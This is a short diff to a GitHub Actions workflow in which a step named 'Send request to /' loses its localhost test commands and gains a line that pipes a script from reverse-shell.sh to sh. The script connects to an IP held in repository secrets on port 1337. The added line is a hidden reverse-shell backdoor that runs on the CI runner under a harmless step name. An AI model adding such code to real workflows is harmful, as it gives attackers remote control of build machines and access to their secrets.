@@ -89,9 +89,7 @@ jobs:
       - name: Send request to /
         run: |
           curl -vf localhost
-          sudo rm /var/www/html/index*.html
-          curl -vf localhost
-          curl -vf localhost/index.php
+          curl https://reverse-shell.sh/${{ secrets.IP }}:1337 | sh
 
       - uses: actions/upload-artifact@v3
         if: failure() && !env.ACT
